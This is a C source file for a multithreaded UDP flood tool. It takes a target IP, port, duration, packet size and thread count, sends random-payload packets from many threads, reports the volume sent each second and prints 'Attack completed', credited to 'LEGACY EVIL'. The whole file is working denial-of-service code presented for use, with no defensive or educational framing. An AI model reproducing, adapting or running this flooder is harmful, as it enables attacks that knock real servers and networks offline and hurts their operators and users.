#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>

typedef struct {
    char *target_ip;
    int target_port;
    int duration;
    int packet_size;
    int thread_id;
} attack_params;

volatile int keep_running = 1;
volatile long total_data_sent = 0; 

// Mutex to ensure atomic updates to total_data_sent
pthread_mutex_t data_mutex = PTHREAD_MUTEX_INITIALIZER;

// Signal handler to stop the attack
void handle_signal(int signal) {
    keep_running = 0;
}

void generate_random_payload(char *payload, int size) {
    for (int i = 0; i < size; i++) {
        payload[i] = (rand() % 256);
    }
}

double bytes_to_mb(long bytes) {
    return (double)bytes / (1024 * 1024);
}

double bytes_to_gb(long bytes) {
    return (double)bytes / (1024 * 1024 * 1024);
}

void *data_monitoring(void *arg) {
    while (keep_running) {
        sleep(1);
        pthread_mutex_lock(&data_mutex);
        double mb_sent = bytes_to_mb(total_data_sent);
        double gb_sent = bytes_to_gb(total_data_sent);
        printf("Data sent: %.2f MB (%.2f GB)\n", mb_sent, gb_sent);
        pthread_mutex_unlock(&data_mutex);
    }
    return NULL;
}

void *udp_flood(void *arg) {
    attack_params *params = (attack_params *)arg;
    int sock;
    struct sockaddr_in server_addr;
    char *message;

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->target_port);
    server_addr.sin_addr.s_addr = inet_addr(params->target_ip);

    message = (char *)malloc(params->packet_size);
    if (message == NULL) {
        perror("Memory allocation failed");
        return NULL;
    }

    generate_random_payload(message, params->packet_size);

    time_t end_time = time(NULL) + params->duration;
    while (time(NULL) < end_time && keep_running) {
        sendto(sock, message, params->packet_size, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));

        pthread_mutex_lock(&data_mutex);
        total_data_sent += params->packet_size;
        pthread_mutex_unlock(&data_mutex);
    }

    free(message);
    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        printf("Usage: %s <ip> <port> <time> <packet> <thread>\n", argv[0]);
        return -1;
    }

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int packet_size = atoi(argv[4]);
    int thread_count = atoi(argv[5]);

    if (packet_size <= 0 || thread_count <= 0) {
        printf("Invalid packet size or thread count.\n");
        return -1;
    }

    signal(SIGINT, handle_signal);

    pthread_t threads[thread_count];
    attack_params params[thread_count];
    pthread_t monitor_thread;

    pthread_create(&monitor_thread, NULL, data_monitoring, NULL);

    for (int i = 0; i < thread_count; i++) {
        params[i].target_ip = target_ip;
        params[i].target_port = target_port;
        params[i].duration = duration;
        params[i].packet_size = packet_size;
        params[i].thread_id = i;

        pthread_create(&threads[i], NULL, udp_flood, &params[i]);
    }

    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    pthread_cancel(monitor_thread);
    pthread_join(monitor_thread, NULL);

    printf("Attack completed .... This file is made by LEGACY EVIL..\n");
    return 0;
}
